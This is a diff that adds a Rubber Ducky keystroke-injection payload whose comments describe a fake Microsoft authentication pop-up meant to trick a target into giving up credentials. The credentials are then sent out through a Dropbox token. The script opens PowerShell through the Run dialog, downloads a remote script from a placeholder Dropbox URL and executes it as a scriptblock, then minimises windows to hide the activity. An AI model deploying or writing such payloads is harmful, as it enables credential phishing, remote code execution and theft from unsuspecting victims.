@@ -1,0 +1,21 @@
+REM Author: Errol Lopez
+REM Fake Microsoft Authentication Pop up 
+REM Fake Microsoft Authentication Pop up Rubber Ducky script that tricks your target into sharing their credentials through a fake authentication pop up message
+REM and send thier credentials via dropbox token.
+REM credits to MAKOZORT's duckyphish. His work inspired me to make this payload
+
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 200
+REM now we read in the script as a scriptblock
+STRING $script2 = [scriptblock]::Create((New-Object Net.WebClient).DownloadString('#DROPBOX_URL'));Invoke-Command -ScriptBlock $script2
+DELAY 500
+ENTER
+GUI m
+
+DEFINE #DROPBOX_URL
+REM You must replace the URL end with ?dl=1!
